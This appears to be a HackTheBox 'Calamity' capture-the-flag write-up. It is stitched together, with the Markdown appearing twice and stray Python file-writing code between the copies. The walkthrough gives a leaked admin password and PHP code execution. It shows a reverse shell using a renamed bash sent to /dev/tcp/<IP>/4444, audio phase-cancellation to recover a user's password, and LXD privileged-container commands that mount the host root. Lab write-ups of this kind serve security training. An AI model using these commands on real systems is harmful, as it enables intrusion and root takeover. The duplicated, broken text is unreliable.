# HackTheBox Writeup: Calamity

| Field | Value |
|---|---|
| **Machine** | Calamity |
| **Difficulty** | Medium |


## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Initial Foothold - Web Application](#2-initial-foothold--web-application)
3. [Pivoting to User - xalvas](#3-pivoting-to-user--xalvas)
4. [Privilege Escalation - LXD](#4-privilege-escalation--lxd)
5. [Attack Path Summary](#5-attack-path-summary)

---

## 1. Enumeration

We start with an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -p- <IP>
```

The scan reveals an Apache web server running on port `80`.

Checking the web root, we find a standard page. Directory fuzzing with `ffuf` or Gobuster reveals two interesting endpoints:

| Endpoint | Status | Details |
|---|---:|---|
| `/admin.php` | `200` | Administration login page |
| `/uploads/` | `301` | Directory listing enabled, but empty |

## 2. Initial Foothold - Web Application

Navigating to `http://<IP>/admin.php`, we are presented with a login form.

Looking at the form's HTML source code reveals a comment containing the password:

```html
<!-- password is:skoupidotenekes-->
```

**Note:** The labels for the username and password fields are swapped in the HTML, but the `name` attributes are `user` and `pass`.

We log in using the following credentials:

| Field | Value |
|---|---|
| Username | `admin` |
| Password | `skoupidotenekes` |

Upon successful login, we are greeted with an **HTML Interpreter** page. The description says the developer built it to practice PHP skills and claims that "HTML is super-harmless to our system".

Testing the interpreter with PHP confirms server-side PHP code execution:

```php
<?php echo "PWNED:".php_uname(); ?>
```

We obtain Remote Code Execution (RCE) as `www-data`.

### Getting a shell - the janitor bypass

Attempts to obtain a reverse shell using standard methods fail because the shell process is terminated shortly after starting.

The writeup attributes this behavior to a background "janitor" script (later observed in `/home/xalvas/intrusions`) that kills blacklisted processes, including `nc`, `bash`, `python`, and `sh`.

One approach described here is to copy Bash to a different name:

```php
<?php system("cp /bin/bash /tmp/myshell && chmod +x /tmp/myshell"); ?>
```

Then trigger a reverse shell using the renamed binary:

```php
<?php system("/tmp/myshell -c '/tmp/myshell -i >& /dev/tcp/<IP>/4444 0>&1'"); ?>
```

Alternatively, the original notes mention using a webshell such as `phpbash.php` or a static C reverse shell.

## 3. Pivoting to User - xalvas

With a shell as `www-data`, we enumerate local users and home directories:

```bash
cat /etc/passwd
ls -la /home/
```

We find a user named `xalvas`. The following files in `/home/xalvas/` are interesting:

- `user.txt` - readable by `www-data`
- `recov.wav`
- `alarmclocks/rick.wav`
- `intrusions`

### Audio forensics

The two WAV files contain the same audio track (Rick Astley), but one has an inverted phase.

To recover the hidden password, open both files in Audacity:

1. Import both WAV files as separate tracks.
2. Select the second track and use **Effect → Invert**.
3. Select both tracks and choose **Tracks → Mix → Mix and Render**.

The music cancels out, leaving a voice that speaks the password:

```text
18547936..*
```

## 4. Privilege Escalation - LXD

We use the discovered credentials to log in via SSH:

```bash
ssh xalvas@<IP>
# Password: 18547936..*
```

Once logged in, we check the user's groups:

```bash
id
# uid=1000(xalvas) gid=1000(xalvas) groups=...,110(lxd),...
```

The user is a member of the `lxd` group. The original notes identify this as the key privilege-escalation misconfiguration: LXD group membership can allow a user to create privileged containers and access host filesystems.

### LXD privilege escalation

The original attack path uses an Alpine image built for the `i686` architecture, imported into LXD and configured as a privileged container with the host root filesystem mounted inside it.

The sequence in the original notes is:

```bash
# Attacker machine
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
python3 -m http.server 8000
```

```bash
# Target machine
wget http://<IP>:8000/alpine-v3.*-i686-*.tar.gz
lxc image import ./alpine-v3.*-i686-*.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

With the host filesystem mounted inside the container, the root flag can be read from:

```bash
cat /mnt/root/root/root.txt
```

## 5. Attack Path Summary

1. **Enumeration:** Nmap identifies the Apache web server.
2. **Credential disclosure:** A comment in the HTML source of `admin.php` reveals the login password.
3. **PHP code execution:** The HTML Interpreter evaluates PHP code, providing RCE as `www-data`.
4. **Shell access:** A renamed Bash binary is used to work around the process-killing janitor script.
5. **User pivot:** Two WAV files are phase-cancelled in Audacity to reveal `xalvas`'s password.
6. **SSH access:** The recovered password provides access as `xalvas`.
7. **Privilege escalation:** Membership in the `lxd` group is abused to access the host filesystem through a privileged container.
8. **Root:** The root flag is read from the mounted host filesystem.
"""

path = Path("/mnt/data/HTB_Calamity_Writeup.md")
path.write_text(content, encoding="utf-8")
print(f"Created: {path} ({path.stat().st_size} bytes)")
from pathlib import Path

content = r"""# HackTheBox Writeup: Calamity

| Field | Value |
|---|---|
| **Machine** | Calamity |
| **Operating System** | Linux (Ubuntu 16.04.2 LTS) |
| **Difficulty** | Medium |
| **Target IP** | `<IP>` |

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Initial Foothold - Web Application](#2-initial-foothold--web-application)
3. [Pivoting to User - xalvas](#3-pivoting-to-user--xalvas)
4. [Privilege Escalation - LXD](#4-privilege-escalation--lxd)
5. [Attack Path Summary](#5-attack-path-summary)

---

## 1. Enumeration

We start with an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -p- <IP>
```

The scan reveals an Apache web server running on port `80`.

Checking the web root, we find a standard page. Directory fuzzing with `ffuf` or Gobuster reveals two interesting endpoints:

| Endpoint | Status | Details |
|---|---:|---|
| `/admin.php` | `200` | Administration login page |
| `/uploads/` | `301` | Directory listing enabled, but empty |

## 2. Initial Foothold - Web Application

Navigating to `http://<IP>/admin.php`, we are presented with a login form.

Looking at the form's HTML source code reveals a comment containing the password:

```html
<!-- password is:skoupidotenekes-->
```

**Note:** The labels for the username and password fields are swapped in the HTML, but the `name` attributes are `user` and `pass`.

We log in using the following credentials:

| Field | Value |
|---|---|
| Username | `admin` |
| Password | `skoupidotenekes` |

Upon successful login, we are greeted with an **HTML Interpreter** page. The description says the developer built it to practice PHP skills and claims that "HTML is super-harmless to our system".

Testing the interpreter with PHP confirms server-side PHP code execution:

```php
<?php echo "PWNED:".php_uname(); ?>
```

We obtain Remote Code Execution (RCE) as `www-data`.

### Getting a shell - the janitor bypass

Attempts to obtain a reverse shell using standard methods fail because the shell process is terminated shortly after starting.

The writeup attributes this behavior to a background "janitor" script (later observed in `/home/xalvas/intrusions`) that kills blacklisted processes, including `nc`, `bash`, `python`, and `sh`.

One approach described here is to copy Bash to a different name:

```php
<?php system("cp /bin/bash /tmp/myshell && chmod +x /tmp/myshell"); ?>
```

Then trigger a reverse shell using the renamed binary:

```php
<?php system("/tmp/myshell -c '/tmp/myshell -i >& /dev/tcp/<IP>/4444 0>&1'"); ?>
```

Alternatively, the original notes mention using a webshell such as `phpbash.php` or a static C reverse shell.

## 3. Pivoting to User - xalvas

With a shell as `www-data`, we enumerate local users and home directories:

```bash
cat /etc/passwd
ls -la /home/
```

We find a user named `xalvas`. The following files in `/home/xalvas/` are interesting:

- `user.txt` - readable by `www-data`
- `recov.wav`
- `alarmclocks/rick.wav`
- `intrusions`

### Audio forensics

The two WAV files contain the same audio track (Rick Astley), but one has an inverted phase.

To recover the hidden password, open both files in Audacity:

1. Import both WAV files as separate tracks.
2. Select the second track and use **Effect → Invert**.
3. Select both tracks and choose **Tracks → Mix → Mix and Render**.

The music cancels out, leaving a voice that speaks the password:

```text
18547936..*
```

## 4. Privilege Escalation - LXD

We use the discovered credentials to log in via SSH:

```bash
ssh xalvas@<IP>
# Password: 18547936..*
```

Once logged in, we check the user's groups:

```bash
id
# uid=1000(xalvas) gid=1000(xalvas) groups=...,110(lxd),...
```

The user is a member of the `lxd` group. The original notes identify this as the key privilege-escalation misconfiguration: LXD group membership can allow a user to create privileged containers and access host filesystems.

### LXD privilege escalation

The original attack path uses an Alpine image built for the `i686` architecture, imported into LXD and configured as a privileged container with the host root filesystem mounted inside it.

```bash
# Attacker machine
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
python3 -m http.server 8000
```

```bash
# Target machine
wget http://<IP>:8000/alpine-v3.*-i686-*.tar.gz
lxc image import ./alpine-v3.*-i686-*.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

With the host filesystem mounted inside the container, the root flag can be read from:

```bash
cat /mnt/root/root/root.txt
```

## 5. Attack Path Summary

1. **Enumeration:** Nmap identifies the Apache web server.
2. **Credential disclosure:** A comment in the HTML source of `admin.php` reveals the login password.
3. **PHP code execution:** The HTML Interpreter evaluates PHP code, providing RCE as `www-data`.
4. **Shell access:** A renamed Bash binary is used to work around the process-killing janitor script.
5. **User pivot:** Two WAV files are phase-cancelled in Audacity to reveal `xalvas`'s password.
6. **SSH access:** The recovered password provides access as `xalvas`.
7. **Privilege escalation:** Membership in the `lxd` group is abused to access the host filesystem through a privileged container.
8. **Root:** The root flag is read from the mounted host filesystem.
"""
